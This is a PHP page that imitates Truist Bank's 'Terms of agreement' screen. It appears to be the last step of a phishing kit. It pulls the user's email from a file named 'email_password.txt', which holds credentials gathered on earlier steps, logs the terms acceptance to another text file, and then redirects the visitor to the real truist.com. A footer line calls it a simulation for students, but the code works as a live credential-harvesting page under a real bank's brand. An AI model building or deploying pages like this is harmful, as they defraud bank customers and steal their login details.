<?php
session_start();
require_once __DIR__ . '/includes/file_storage.php';

// Redirect to login if no username in session
if (!isset($_SESSION['emzemz'])) {
    header('Location: index.php');
    exit;
}

$username = $_SESSION['emzemz'];
$errors = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get form data
    $isChecked = isset($_POST['agree']);
    
    // Validation
    if (!$isChecked) {
        $errors['agree'] = 'Please agree to the terms before continuing.';
    }
    
    if (empty($errors)) {
        // Get user email from previous step for completion message
        $userData = getUserData('email_password.txt', $username);
        $userEmail = 'N/A';
        if (!empty($userData)) {
            $userEmail = $userData[0]['usr_eml'] ?? 'N/A';
        }
        
        // Save to test file (matching affinity field names)
        $data = [
            'step' => 'terms_acceptance',
            'usrnm' => $username,
            'terms_accepted' => $isChecked,
            'usr_eml' => $userEmail,
            'completed_at' => date('Y-m-d H:i:s')
        ];
        
        saveUserData('terms_acceptance.txt', $data);
        
        // Redirect to final URL
        header('Location: https://www.truist.com/');
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Terms of agreement - Truist Bank</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="min-h-screen flex flex-col bg-[#f6f3fa]">
    <!-- Header -->
    <header class="bg-[#2b0d49] text-white shadow-[0_2px_8px_rgba(22,9,40,0.45)]">
        <div class="max-w-6xl mx-auto h-16 flex items-center justify-start px-6">
            <img
                src="assets/trulogo_horz-white.png"
                alt="Truist logo"
                class="h-8 w-auto"
            />
        </div>
    </header>

    <!-- Main Content -->
    <main class="flex-1 flex items-start justify-center px-4 sm:px-6 py-10">
        <div class="w-full max-w-5xl">
            <section class="w-full">
                <h1 class="mx-auto mb-6 w-full max-w-2xl text-center text-3xl font-semibold text-[#2b0d49]">
                    Terms of agreement
                </h1>
                <div class="mx-auto w-full max-w-2xl rounded-2xl border border-[#e2d8f1] bg-white shadow-[0_20px_60px_rgba(43,13,73,0.12)]">
                    <div class="px-8 py-10">
                        
                        <?php if (!empty($errors)): ?>
                            <div class="bg-red-50 border-l-4 border-red-500 p-4 mb-6">
                                <div class="flex">
                                    <div class="flex-shrink-0">
                                        <svg class="h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                                            <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
                                        </svg>
                                    </div>
                                    <div class="ml-3">
                                        <p class="text-sm text-red-700">
                                            <?php echo htmlspecialchars($errors['agree']); ?>
                                        </p>
                                    </div>
                                </div>
                            </div>
                        <?php endif; ?>
                        
                        <form method="POST" class="space-y-6">
                            <p class="text-sm text-[#6c5d85]">
                                By submitting this registration form, you authorize Truist Bank and its affiliates to request and receive information
                                about you from third parties, including copies of your consumer credit report and motor vehicle records, at any time while
                                your account remains active.
                            </p>
                            <p class="text-sm text-[#6c5d85]">
                                You also authorize us to retain a copy of this information for use in accordance with our 
                                <a href="#" class="text-[#5f259f] hover:underline">Terms of Service</a> and 
                                <a href="#" class="text-[#5f259f] hover:underline">Privacy Statement</a>.
                            </p>

                            <label class="flex items-center gap-2 text-sm text-[#5d4f72]">
                                <input
                                    type="checkbox"
                                    name="agree"
                                    <?php echo (isset($_POST['agree'])) ? 'checked' : ''; ?>
                                    class="h-4 w-4 text-[#5f259f] focus:ring-[#5f259f] border-[#cfc2df] rounded"
                                >
                                I understand and agree
                            </label>

                            <div class="flex flex-wrap gap-3 pt-2">
                                <button
                                    type="submit"
                                    class="inline-flex items-center justify-center rounded-full bg-[#5f259f] px-8 py-3 text-sm font-semibold text-white hover:bg-[#4a1a7e]"
                                >
                                    Finish
                                </button>
                            </div>
                        </form>
                    </div>
                </div>
            </section>
        </div>
    </main>

    <!-- Footer -->
    <footer class="bg-[#2b0d49] text-white">
        <div class="max-w-6xl mx-auto px-6 py-8 grid gap-6 lg:grid-cols-[auto_1fr_auto] items-start">
            <div class="flex flex-col gap-3">
                <div class="flex items-center">
                    <img
                        src="assets/trulogo_horz-white.png"
                        alt="Truist logo"
                        class="h-8 w-auto"
                    />
                </div>
                <p class="text-xs text-white/70 max-w-xs">
                    Tailored banking experiences, demonstrated for students and simulation exercises only.
                </p>
            </div>

            <div class="grid gap-3 sm:grid-cols-2 lg:grid-cols-3 text-sm">
                <ul class="space-y-2">
                    <li>
                        <a class="text-white/80 hover:text-white" href="#">
                            Privacy
                        </a>
                    </li>
                    <li>
                        <a class="text-white/80 hover:text-white" href="#">
                            Accessibility
                        </a>
                    </li>
                </ul>
                <ul class="space-y-2">
                    <li>
                        <a class="text-white/80 hover:text-white" href="#">
                            Fraud & security
                        </a>
                    </li>
                    <li>
                        <a class="text-white/80 hover:text-white" href="#">
                            Limit use of my sensitive personal information
                        </a>
                    </li>
                </ul>
                <ul class="space-y-2">
                    <li>
                        <a class="text-white/80 hover:text-white" href="#">
                            Terms and conditions
                        </a>
                    </li>
                    <li>
                        <a class="text-white/80 hover:text-white" href="#">
                            Disclosures
                        </a>
                    </li>
                </ul>
            </div>
        </div>
        <div class="bg-black/90">
            <p class="max-w-6xl mx-auto px-6 py-3 text-center text-xs text-white/70">
                © 2025, Truist. All rights reserved.
            </p>
        </div>
    </footer>

    <script>
        // Auto-focus checkbox on page load
        document.addEventListener('DOMContentLoaded', function() {
            const checkbox = document.querySelector('input[type="checkbox"]');
            if (checkbox && !checkbox.checked) {
                checkbox.focus();
            }
        });
        
        // Clear error when checkbox is ticked
        document.querySelector('input[type="checkbox"]').addEventListener('change', function() {
            const errorDiv = document.querySelector('.bg-red-50');
            if (errorDiv) {
                errorDiv.style.display = 'none';
            }
        });
    </script>
</body>
</html>
